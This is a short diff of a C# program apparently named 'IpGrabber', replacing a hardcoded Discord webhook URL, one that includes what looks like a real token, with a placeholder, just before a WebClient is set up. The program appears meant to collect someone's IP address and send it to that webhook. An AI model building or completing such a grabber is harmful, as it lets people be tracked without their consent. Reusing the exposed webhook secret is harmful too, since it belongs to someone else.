@@ -8,7 +8,7 @@ namespace IpGrabber
     {
         static void Main(string[] args)
         {
-            string webhook = "https://discord.com/api/webhooks/911338915233935401/J--ja5mETW4iPBNoX6jxblQUSn9MLqfj4t8ZT9KwLEIZ-xUKUaZ_jnpBIEtZfgCcvEX1";
+            string webhook = "YOUR_DISCORD_WEBHOOK";
 
 
             var wbc = new WebClient();
